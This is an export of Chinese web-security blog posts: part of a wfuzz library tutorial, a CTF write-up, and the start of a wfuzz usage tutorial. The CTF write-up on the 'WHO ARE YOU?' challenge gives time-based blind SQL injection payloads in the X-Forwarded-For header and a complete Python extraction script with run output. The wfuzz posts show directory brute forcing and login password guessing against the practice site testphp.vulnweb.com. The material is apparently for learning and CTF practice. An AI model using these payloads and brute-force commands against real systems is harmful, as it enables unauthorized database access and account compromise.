<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">┌─[michael@parrot]─[~]</span><br><span class="line">└──╼ $python</span><br><span class="line">Python <span class="number">2.7</span><span class="number">.14</span>+ (default, Feb  <span class="number">6</span> <span class="number">2018</span>, <span class="number">19</span>:<span class="number">12</span>:<span class="number">18</span>) </span><br><span class="line">[GCC <span class="number">7.3</span><span class="number">.0</span>] on linux2</span><br><span class="line"><span class="type">Type</span> <span class="string">&quot;help&quot;</span>, <span class="string">&quot;copyright&quot;</span>, <span class="string">&quot;credits&quot;</span> <span class="keyword">or</span> <span class="string">&quot;license&quot;</span> <span class="keyword">for</span> more information.</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> wfuzz</span><br></pre></td></tr></table></figure>

<p>现在，来体验一下使用库进行目录扫描是什么感觉：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> wfuzz</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> r <span class="keyword">in</span> wfuzz.fuzz(url=<span class="string">&quot;http://testphp.vulnweb.com/FUZZ&quot;</span>, hc=[<span class="number">404</span>], payloads=[(<span class="string">&quot;file&quot;</span>,<span class="built_in">dict</span>(fn=<span class="string">&quot;wordlist/general/common.txt&quot;</span>))]):</span><br><span class="line"><span class="meta">... </span>    <span class="built_in">print</span> r</span><br><span class="line">...</span><br><span class="line">00060:  C=<span class="number">301</span>      <span class="number">7</span> L        <span class="number">12</span> W          <span class="number">184</span> Ch        <span class="string">&quot;admin&quot;</span></span><br><span class="line">00183:  C=<span class="number">403</span>     <span class="number">10</span> L        <span class="number">29</span> W          <span class="number">263</span> Ch        <span class="string">&quot;cgi-bin&quot;</span></span><br><span class="line">00429:  C=<span class="number">301</span>      <span class="number">7</span> L        <span class="number">12</span> W          <span class="number">184</span> Ch        <span class="string">&quot;images&quot;</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>扫描后，我们就得到了一个<code>FuzzResult</code>的对象<code>r</code>，从中我们可以得到所有的信息。</p>
<hr>
<h3 id="FuzzSession对象"><a href="#FuzzSession对象" class="headerlink" title="FuzzSession对象"></a>FuzzSession对象</h3><p>FuzzSession对象拥有wfuzz API的所有函数方法。<br>FuzzSession对象允许我们在测试会话中获取一些参数。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> wfuzz</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s=wfuzz.FuzzSession(url=<span class="string">&quot;http://testphp.vulnweb.com/FUZZ&quot;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> r <span class="keyword">in</span> s.fuzz(hc=[<span class="number">404</span>], payloads=[(<span class="string">&quot;file&quot;</span>,<span class="built_in">dict</span>(fn=<span class="string">&quot;wordlist/general/common.txt&quot;</span>))]):</span><br><span class="line"><span class="meta">... </span>    <span class="built_in">print</span> r</span><br><span class="line">...</span><br><span class="line">00060:  C=<span class="number">301</span>      <span class="number">7</span> L        <span class="number">12</span> W          <span class="number">184</span> Ch        <span class="string">&quot;admin&quot;</span></span><br><span class="line">00183:  C=<span class="number">403</span>     <span class="number">10</span> L        <span class="number">29</span> W          <span class="number">263</span> Ch        <span class="string">&quot;cgi-bin&quot;</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>FuzzSession对象还可以当作上下文管理器来使用：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">with</span> wfuzz.FuzzSession(url=<span class="string">&quot;http://testphp.vulnweb.com/FUZZ&quot;</span>, hc=[<span class="number">404</span>], payloads=[(<span class="string">&quot;file&quot;</span>,<span class="built_in">dict</span>(fn=<span class="string">&quot;wordlist/general/common.txt&quot;</span>))]) <span class="keyword">as</span> s:</span><br><span class="line"><span class="meta">... </span>    <span class="keyword">for</span> r <span class="keyword">in</span> s.fuzz():</span><br><span class="line"><span class="meta">... </span>            <span class="built_in">print</span> r</span><br><span class="line">...</span><br><span class="line">00295:  C=<span class="number">301</span>      <span class="number">7</span> L        <span class="number">12</span> W          <span class="number">184</span> Ch        <span class="string">&quot;admin&quot;</span></span><br><span class="line">00418:  C=<span class="number">403</span>     <span class="number">10</span> L        <span class="number">29</span> W          <span class="number">263</span> Ch        <span class="string">&quot;cgi-bin&quot;</span></span><br></pre></td></tr></table></figure>

<hr>
<h3 id="生成Payload"><a href="#生成Payload" class="headerlink" title="生成Payload"></a>生成Payload</h3><p><code>get_payload</code>方法可以生成wfuzz的payload，这是一个在不使用wfuzz payload plugins的情况下，使用编程的方法获得payload的方便快速的途径。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> wfuzz</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> r <span class="keyword">in</span> wfuzz.get_payload(<span class="built_in">range</span>(<span class="number">5</span>)).fuzz(url=<span class="string">&quot;http://testphp.vulnweb.com/FUZZ&quot;</span>):</span><br><span class="line"><span class="meta">... </span>    <span class="built_in">print</span> r</span><br><span class="line">...</span><br><span class="line">00012:  C=<span class="number">404</span>      <span class="number">7</span> L        <span class="number">12</span> W          <span class="number">168</span> Ch        <span class="string">&quot;0&quot;</span></span><br><span class="line">00013:  C=<span class="number">404</span>      <span class="number">7</span> L        <span class="number">12</span> W          <span class="number">168</span> Ch        <span class="string">&quot;1&quot;</span></span><br><span class="line">00014:  C=<span class="number">404</span>      <span class="number">7</span> L        <span class="number">12</span> W          <span class="number">168</span> Ch        <span class="string">&quot;2&quot;</span></span><br><span class="line">00015:  C=<span class="number">404</span>      <span class="number">7</span> L        <span class="number">12</span> W          <span class="number">168</span> Ch        <span class="string">&quot;3&quot;</span></span><br><span class="line">00016:  C=<span class="number">404</span>      <span class="number">7</span> L        <span class="number">12</span> W          <span class="number">168</span> Ch        <span class="string">&quot;4&quot;</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>

<p>这个方法在需要多个payloads的时候可以这样使用：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> wfuzz</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> r <span class="keyword">in</span> wfuzz.get_payloads([<span class="built_in">range</span>(<span class="number">5</span>), [<span class="string">&quot;a&quot;</span>,<span class="string">&quot;b&quot;</span>]]).fuzz(url=<span class="string">&quot;http://testphp.vulnweb.com/FUZZ/FUZ2Z&quot;</span>):</span><br><span class="line"><span class="meta">... </span>    <span class="built_in">print</span> r</span><br><span class="line">...</span><br><span class="line">00028:  C=<span class="number">404</span>      <span class="number">7</span> L        <span class="number">12</span> W          <span class="number">168</span> Ch        <span class="string">&quot;4 - b&quot;</span></span><br><span class="line">00027:  C=<span class="number">404</span>      <span class="number">7</span> L        <span class="number">12</span> W          <span class="number">168</span> Ch        <span class="string">&quot;4 - a&quot;</span></span><br><span class="line">00024:  C=<span class="number">404</span>      <span class="number">7</span> L        <span class="number">12</span> W          <span class="number">168</span> Ch        <span class="string">&quot;2 - b&quot;</span></span><br><span class="line">00026:  C=<span class="number">404</span>      <span class="number">7</span> L        <span class="number">12</span> W          <span class="number">168</span> Ch        <span class="string">&quot;3 - b&quot;</span></span><br><span class="line">00025:  C=<span class="number">404</span>      <span class="number">7</span> L        <span class="number">12</span> W          <span class="number">168</span> Ch        <span class="string">&quot;3 - a&quot;</span></span><br><span class="line">00022:  C=<span class="number">404</span>      <span class="number">7</span> L        <span class="number">12</span> W          <span class="number">168</span> Ch        <span class="string">&quot;1 - b&quot;</span></span><br><span class="line">00021:  C=<span class="number">404</span>      <span class="number">7</span> L        <span class="number">12</span> W          <span class="number">168</span> Ch        <span class="string">&quot;1 - a&quot;</span></span><br><span class="line">00020:  C=<span class="number">404</span>      <span class="number">7</span> L        <span class="number">12</span> W          <span class="number">168</span> Ch        <span class="string">&quot;0 - b&quot;</span></span><br><span class="line">00023:  C=<span class="number">404</span>      <span class="number">7</span> L        <span class="number">12</span> W          <span class="number">168</span> Ch        <span class="string">&quot;2 - a&quot;</span></span><br><span class="line">00019:  C=<span class="number">404</span>      <span class="number">7</span> L        <span class="number">12</span> W          <span class="number">168</span> Ch        <span class="string">&quot;0 - a&quot;</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="生成Session"><a href="#生成Session" class="headerlink" title="生成Session"></a>生成Session</h3><p><code>get_session</code>方法可以使用命令行的参数来生成编程下的 FuzzSession 对象。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> wfuzz</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> r <span class="keyword">in</span> wfuzz.get_session(<span class="string">&quot;-z range,0-10 http://testphp.vulnweb.com/FUZZ&quot;</span>).fuzz():</span><br><span class="line"><span class="meta">... </span>    <span class="built_in">print</span> r</span><br><span class="line">...</span><br><span class="line">00002:  C=<span class="number">404</span>      <span class="number">7</span> L        <span class="number">12</span> W          <span class="number">168</span> Ch        <span class="string">&quot;1&quot;</span></span><br><span class="line">00011:  C=<span class="number">404</span>      <span class="number">7</span> L        <span class="number">12</span> W          <span class="number">168</span> Ch        <span class="string">&quot;10&quot;</span></span><br><span class="line">00008:  C=<span class="number">404</span>      <span class="number">7</span> L        <span class="number">12</span> W          <span class="number">168</span> Ch        <span class="string">&quot;7&quot;</span></span><br><span class="line">00001:  C=<span class="number">404</span>      <span class="number">7</span> L        <span class="number">12</span> W          <span class="number">168</span> Ch        <span class="string">&quot;0&quot;</span></span><br><span class="line">00003:  C=<span class="number">404</span>      <span class="number">7</span> L        <span class="number">12</span> W          <span class="number">168</span> Ch        <span class="string">&quot;2&quot;</span></span><br><span class="line">00004:  C=<span class="number">404</span>      <span class="number">7</span> L        <span class="number">12</span> W          <span class="number">168</span> Ch        <span class="string">&quot;3&quot;</span></span><br><span class="line">00005:  C=<span class="number">404</span>      <span class="number">7</span> L        <span class="number">12</span> W          <span class="number">168</span> Ch        <span class="string">&quot;4&quot;</span></span><br><span class="line">00006:  C=<span class="number">404</span>      <span class="number">7</span> L        <span class="number">12</span> W          <span class="number">168</span> Ch        <span class="string">&quot;5&quot;</span></span><br><span class="line">00007:  C=<span class="number">404</span>      <span class="number">7</span> L        <span class="number">12</span> W          <span class="number">168</span> Ch        <span class="string">&quot;6&quot;</span></span><br><span class="line">00009:  C=<span class="number">404</span>      <span class="number">7</span> L        <span class="number">12</span> W          <span class="number">168</span> Ch        <span class="string">&quot;8&quot;</span></span><br><span class="line"><span class="number">000</span>10:  C=<span class="number">404</span>      <span class="number">7</span> L        <span class="number">12</span> W          <span class="number">168</span> Ch        <span class="string">&quot;9&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>web-sec</category>
      </categories>
  </entry>
  <entry>
    <title>实验吧CTF WHO ARE YOU? Write-Up</title>
    <url>/web-sec/%E5%AE%9E%E9%AA%8C%E5%90%A7CTF%20WHO%20ARE%20YOU_%20Write-Up%20.html</url>
    <content><![CDATA[<p>[TOC]<br>##介绍</p>
<ol>
<li>这是一道<code>Time-based Blind</code>时间盲注的题目。</li>
<li>SQLMAP自带的脚本无法完成注入。</li>
<li>注入点要<code>header</code>中的<code>x-forwarded-for</code>。</li>
</ol>
<p>##确定库数量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /web/wonderkun/index.php HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: ctf5.shiyanbar.com</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0</span><br><span class="line"></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"></span><br><span class="line">x-forwarded-for: 127.0.0.1&#x27; and (select case when (select count(*) from information_schema.schemata)=3 then sleep(5) else 1 end) and &#x27;1&#x27;=&#x27;1</span><br><span class="line"></span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line"></span><br><span class="line">Referer: http://www.shiyanbar.com/ctf/1941</span><br><span class="line"></span><br><span class="line">Cookie: Hm_lvt_34d6f7353ab0915a4c582e4516dffbc3=1508208443; Hm_cv_34d6f7353ab0915a4c582e4516dffbc3=1*visitor*112186%2CnickName%3Am0nst3r; PHPSESSID=01ip3nh6419ngbse16vt662di7; Hm_lpvt_34d6f7353ab0915a4c582e4516dffbc3=1508378062</span><br><span class="line"></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>当等于<code>3</code>的时候，响应为5秒，故数据库数量为3。<br>##确定库名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /web/wonderkun/index.php HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: ctf5.shiyanbar.com</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0</span><br><span class="line"></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"></span><br><span class="line">x-forwarded-for: 127.0.0.1&#x27; and (select case when (ascii(substr((select schema_name from information_schema.schemata limit 1 offset 0) from 1 for 1)))&gt;1 then sleep(5) else 1 end) and &#x27;1&#x27;=&#x27;1</span><br><span class="line"></span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line"></span><br><span class="line">Referer: http://www.shiyanbar.com/ctf/1941</span><br><span class="line"></span><br><span class="line">Cookie: Hm_lvt_34d6f7353ab0915a4c582e4516dffbc3=1508208443; Hm_cv_34d6f7353ab0915a4c582e4516dffbc3=1*visitor*112186%2CnickName%3Am0nst3r; PHPSESSID=01ip3nh6419ngbse16vt662di7; Hm_lpvt_34d6f7353ab0915a4c582e4516dffbc3=1508378062</span><br><span class="line"></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>##确定表名</p>
<p>##确定列名</p>
<p>##查询flag<br>看到过网上一篇文章写了一个脚本来跑，但是后来自己在实验过程中发现不对，原因是原作者的<code>判断</code>条件是用<code>字符</code>来判断的，然而：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> use mysql</span><br><span class="line">Reading <span class="keyword">table</span> information <span class="keyword">for</span> completion <span class="keyword">of</span> <span class="keyword">table</span> <span class="keyword">and</span> <span class="keyword">column</span> names</span><br><span class="line">You can turn off this feature <span class="keyword">to</span> <span class="keyword">get</span> a quicker startup <span class="keyword">with</span> <span class="operator">-</span>A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="keyword">user</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> <span class="string">&#x27;a&#x27;</span><span class="operator">=</span><span class="string">&#x27;A&#x27;</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">user</span>             <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+</span></span><br><span class="line"><span class="operator">|</span> root             <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> root             <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> root             <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> debian<span class="operator">-</span>sys<span class="operator">-</span>maint <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> root             <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+</span></span><br><span class="line"><span class="number">5</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>在MySQL看来，<code>a</code>和<code>A</code>是相等的，这就导致如果flag区分大小写的话，即使我们跑出来的是正确的字符，也不能成功。</p>
<p>另外，那个脚本是用的<code>逐个字符判断</code>的方法，导致需要发很多数据包才行，不是很方便。</p>
<p>##脚本<br>自己写了个更方便的脚本，利用的是<code>比较大小,确定范围</code>的方法，由于不是计算机专业，这个算法好像有个高大尚的名词，不过我忘记了，Orz，原理是每次判断先取范畴内中间的数，如果比这个数大，再取这个数和最在数之间的中间数，再判断，就好像折纸一样，每次取一半，这样的比较速度是很快的，发包也是很少。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ctf_url = <span class="string">&#x27;http://ctf5.shiyanbar.com/web/wonderkun/index.php&#x27;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">TestRange</span>(<span class="params">i,rangeToTest</span>):</span><br><span class="line">	m = <span class="built_in">len</span>(rangeToTest)/<span class="number">2</span></span><br><span class="line">	checkRes = CheckAsc(i,rangeToTest[m])</span><br><span class="line">	<span class="keyword">return</span> checkRes</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">CheckAsc</span>(<span class="params">myPosition,theAscii</span>):</span><br><span class="line">	checkRes = <span class="number">0</span> <span class="comment">#1: bigger; -1: smaller</span></span><br><span class="line">	headers = &#123;<span class="string">&quot;x-forwarded-for&quot;</span>:<span class="string">&quot;127.0.0.1&#x27; &quot;</span>+<span class="string">&quot;and (select case when (ascii(substr((select flag from flag) from %d for 1)))&gt;%d then sleep(10) else 1 end) and &#x27;1&#x27;=&#x27;1&quot;</span> %(myPosition,theAscii)&#125;</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		<span class="built_in">print</span> <span class="string">&quot;[?]: Bigger than %d....&quot;</span> % theAscii</span><br><span class="line">		response = requests.get(ctf_url,headers=headers,timeout=<span class="number">8</span>)</span><br><span class="line">		checkRes = -<span class="number">1</span></span><br><span class="line">		<span class="built_in">print</span> <span class="string">&quot;[-]: NO&quot;</span></span><br><span class="line">	<span class="keyword">except</span> requests.exceptions.ReadTimeout,e:</span><br><span class="line">		checkRes = <span class="number">1</span></span><br><span class="line">		<span class="built_in">print</span> <span class="string">&quot;[+]: YES&quot;</span></span><br><span class="line">	<span class="keyword">return</span> checkRes</span><br><span class="line">							</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">SetRange</span>(<span class="params">condition, r</span>):</span><br><span class="line">	m = <span class="built_in">len</span>(r)/<span class="number">2</span></span><br><span class="line">	<span class="keyword">if</span> condition == <span class="number">1</span>:</span><br><span class="line">		toTest = r[m:]</span><br><span class="line">	<span class="keyword">elif</span> condition == -<span class="number">1</span>:</span><br><span class="line">		toTest = r[:m+<span class="number">1</span>]</span><br><span class="line">	<span class="built_in">print</span> <span class="string">&quot;[i]: Adjusting the range to [%d-%d]&quot;</span> % (toTest[<span class="number">0</span>],toTest[-<span class="number">1</span>])</span><br><span class="line">	<span class="keyword">return</span> toTest</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">CheckEqual</span>(<span class="params">myPosition, theAscii</span>):</span><br><span class="line">	isEqual = <span class="string">&#x27;&#x27;</span></span><br><span class="line">	headers = &#123;<span class="string">&quot;x-forwarded-for&quot;</span>:<span class="string">&quot;127.0.0.1&#x27; &quot;</span>+<span class="string">&quot;and (select case when (ascii(substr((select flag from flag) from %d for 1)))=%d then sleep(6) else 1 end) and &#x27;1&#x27;=&#x27;1&quot;</span> %(myPosition,theAscii)&#125;</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		response = requests.get(ctf_url,headers=headers,timeout=<span class="number">4</span>)</span><br><span class="line">		isEqual = <span class="number">0</span></span><br><span class="line">	<span class="keyword">except</span> requests.exceptions.ReadTimeout,e:</span><br><span class="line">		isEqual = <span class="number">1</span></span><br><span class="line">	<span class="keyword">return</span> isEqual</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	x = <span class="number">1</span></span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">33</span>):</span><br><span class="line">		test = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>)]</span><br><span class="line">		<span class="built_in">print</span> <span class="string">&quot;[i]: Current Position %d&quot;</span> % x</span><br><span class="line">		f = <span class="number">0</span></span><br><span class="line">		<span class="keyword">while</span>(f == <span class="number">0</span>):</span><br><span class="line">			biggersmaller = TestRange(x,test)</span><br><span class="line">			test = SetRange(biggersmaller,test)</span><br><span class="line">			f = CheckEqual(x,test[<span class="built_in">len</span>(test)/<span class="number">2</span>])</span><br><span class="line">			<span class="keyword">if</span> f ==<span class="number">1</span>:</span><br><span class="line">				<span class="built_in">print</span> <span class="string">&quot;[*] Found ASCII: %d&quot;</span> % test[<span class="built_in">len</span>(test)/<span class="number">2</span>]</span><br><span class="line">				flag += <span class="built_in">chr</span>(test[<span class="built_in">len</span>(test)/<span class="number">2</span>])</span><br><span class="line">				<span class="built_in">print</span> flag</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">		<span class="built_in">print</span> <span class="string">&quot;ctf&#123;%s&#125;&quot;</span> % flag</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>运行过程如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[i]: Current Position 8</span><br><span class="line">[?]: Bigger than 79....</span><br><span class="line">[-]: NO</span><br><span class="line">[i]: Adjusting the range to [32-79]</span><br><span class="line">[?]: Bigger than 56....</span><br><span class="line">[+]: YES</span><br><span class="line">[i]: Adjusting the range to [56-79]</span><br><span class="line">[?]: Bigger than 68....</span><br><span class="line">[-]: NO</span><br><span class="line">[i]: Adjusting the range to [56-68]</span><br><span class="line">[?]: Bigger than 62....</span><br><span class="line">[-]: NO</span><br><span class="line">[i]: Adjusting the range to [56-62]</span><br><span class="line">[?]: Bigger than 59....</span><br><span class="line">[-]: NO</span><br><span class="line">[i]: Adjusting the range to [56-59]</span><br><span class="line">[?]: Bigger than 58....</span><br><span class="line">[-]: NO</span><br><span class="line">[i]: Adjusting the range to [56-58]</span><br><span class="line">[*] Found ASCII: 57</span><br><span class="line">cdbf14c9</span><br><span class="line">ctf:cdbf14c9</span><br><span class="line">[i]: Current Position 9</span><br><span class="line">[?]: Bigger than 79....</span><br><span class="line">[-]: NO</span><br><span class="line">[i]: Adjusting the range to [32-79]</span><br><span class="line">[?]: Bigger than 56....</span><br><span class="line">[-]: NO</span><br><span class="line">[i]: Adjusting the range to [32-56]</span><br><span class="line">[?]: Bigger than 44....</span><br><span class="line">[+]: YES</span><br><span class="line">[i]: Adjusting the range to [44-56]</span><br><span class="line">[?]: Bigger than 50....</span><br><span class="line">[+]: YES</span><br><span class="line">[i]: Adjusting the range to [50-56]</span><br><span class="line">[*] Found ASCII: 53</span><br><span class="line">cdbf14c95</span><br><span class="line">ctf:cdbf14c95</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>基本上，6-8个包可以确定一位。</p>
<p>##参考</p>
<ol>
<li><a href="http://blog.csdn.net/qq_35078631/article/details/54773769" title="Assassin的WriteUp">Assassin的WriteUp</a></li>
<li>对于如何确定库名和表名，请自行参考这里：<a href="http://m0nst3r.me/sqli/114.html" title="MySQL中的Information_schema介绍">MySQL中的Information_schema介绍</a></li>
</ol>
<p>##写在最后<br>虽然我的脚本跑出来了，但是<code>结果是错的</code>。Orz…<br>求大神指点！</p>
]]></content>
      <categories>
        <category>web-sec</category>
      </categories>
  </entry>
  <entry>
    <title>史上最详[ZI]细[DUO]的wfuzz中文教程（二）——wfuzz 基本用法</title>
    <url>/web-sec/%E5%8F%B2%E4%B8%8A%E6%9C%80%E8%AF%A6%5BZI%5D%E7%BB%86%5BDUO%5D%E7%9A%84wfuzz%E4%B8%AD%E6%96%87%E6%95%99%E7%A8%8B%EF%BC%88%E4%BA%8C%EF%BC%89%E2%80%94%E2%80%94wfuzz%20%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95.html</url>
    <content><![CDATA[<blockquote>
<blockquote>
<p>本文已在丁牛网安实验室FreeBuf专栏 <a href="http://www.freebuf.com/column/163632.html" title="DigApis安全">DigApis安全</a> 中首发！引用转发请注明 “原文来自：DigApis安全 m0nst3r”字样，谢谢！</p>
</blockquote>
</blockquote>
<p>[TOC]</p>
<h2 id="wfuzz-基本用法"><a href="#wfuzz-基本用法" class="headerlink" title="wfuzz 基本用法"></a>wfuzz 基本用法</h2><hr>
<h3 id="暴破文件和路径"><a href="#暴破文件和路径" class="headerlink" title="暴破文件和路径"></a>暴破文件和路径</h3><p>wfuzz可以用来查找一个web server中的隐藏的文件和路径，来扩大攻击面。值得注意的是，这种测试的成功与否很大程度上要依赖于使用的字典。<br>但是，一个web server的平台是有限的，还有一些是默认安装，再加上一些已知的资源比如日志文件，管理路径等等，我们还是可以在猜测到发现很多东西。因此，暴破文件的路径还是可行的。</p>
<p>wfuzz自带一些字典文件，更多的字典可以参考下面两个开放的git：</p>
<ul>
<li><a href="https://code.google.com/p/fuzzdb/" title="fuzzdb">fuzzdb</a></li>
<li><a href="https://github.com/danielmiessler/SecLists" title="seclists">seclists</a></li>
</ul>
<p>使用wfuzz暴力猜测目录的命令如下：<br><code>$ wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt http://testphp.vulnweb.com/FUZZ</code></p>
<p>使用wfuzz暴力猜测文件的命令如下：<br><code>$ wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt http://testphp.vulnweb.com/FUZZ.php</code></p>
<hr>
<h3 id="测试URL中的参数"><a href="#测试URL中的参数" class="headerlink" title="测试URL中的参数"></a>测试URL中的参数</h3><p>通过在URL中在<code>？</code>后面设置FUZZ占位符，我们就可以使用wfuzz来测试URL传入的参数：<br><code>$ wfuzz -z range,0-10 --hl 97 http://testphp.vulnweb.com/listproducts.php?cat=FUZZ</code></p>
<hr>
<h3 id="测试POST请求"><a href="#测试POST请求" class="headerlink" title="测试POST请求"></a>测试POST请求</h3><p>如果想使用wfuzz测试<code>form-encoded</code>的数据，比如 HTML表单那样的，只需要传入<code>-d</code>参数即可：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌─[michael@parrot]─[/usr/share/wfuzz/wordlist]</span><br><span class="line">└──╼ $wfuzz -z file,/usr/share/wfuzz/wordlist/others/common_pass.txt -d &quot;uname=FUZZ&amp;pass=FUZZ&quot; --hc 302 http://testphp.vulnweb.com/userinfo.php</span><br><span class="line">********************************************************</span><br><span class="line">* Wfuzz 2.2.9 - The Web Fuzzer                         *</span><br><span class="line">********************************************************</span><br><span class="line"></span><br><span class="line">Target: http://testphp.vulnweb.com/userinfo.php</span><br><span class="line">Total requests: 52</span><br><span class="line"></span><br><span class="line">==================================================================</span><br><span class="line">ID	Response   Lines      Word         Chars          Payload    </span><br><span class="line">==================================================================</span><br><span class="line"></span><br><span class="line">000044:  C=200    114 L	     356 W	   5111 Ch	  &quot;test&quot;</span><br><span class="line"></span><br><span class="line">Total time: 1.308365</span><br><span class="line">Processed Requests: 52</span><br><span class="line">Filtered Requests: 51</span><br><span class="line">Requests/sec.: 39.74425</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="测试Cookies"><a href="#测试Cookies" class="headerlink" title="测试Cookies"></a>测试Cookies</h3><p>在测试请求中加入自己设置的cookies，可以使用<code>-b</code>参数指定，多个cookies使用多次。<br><code>$ wfuzz -z file,/usr/share/wfuzz/wordlist/general/common.txt -b cookie=value1 -b cookie2=value2 http://testphp.vulnweb.com/FUZZ</code></p>
<p>以上命令可生成如下的HTTP请求：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">GET /attach HTTP/1.1</span><br><span class="line">Host: testphp.vulnweb.com</span><br><span class="line">Accept: */*</span><br><span class="line">Content-Type:  application/x-www-form-urlencoded</span><br><span class="line">Cookie:  cookie=value1; cookie2=value2</span><br><span class="line">User-Agent:  Wfuzz/2.2</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>

<p>测试cookie字段的话，可以使用下面的命令：<br><code>$ wfuzz -z file,/usr/share/wfuzz/wordlist/general/common.txt -b cookie=FUZZ http://testphp.vulnweb.com/</code></p>
<hr>
<h3 id="测试自定义请求头"><a href="#测试自定义请求头" class="headerlink" title="测试自定义请求头"></a>测试自定义请求头</h3><p>使用<code>-H</code>参数来指定HTTP请求的请求头，多次指定多次使用。<br><code>$ wfuzz -z file,/usr/share/wfuzz/wordlist/general/common.txt -H &quot;myheader: headervalue&quot; -H &quot;myheader2: headervalue2&quot; http://testphp.vulnweb.com/FUZZ</code></p>
<p>生成的HTTP请求如下：</p>
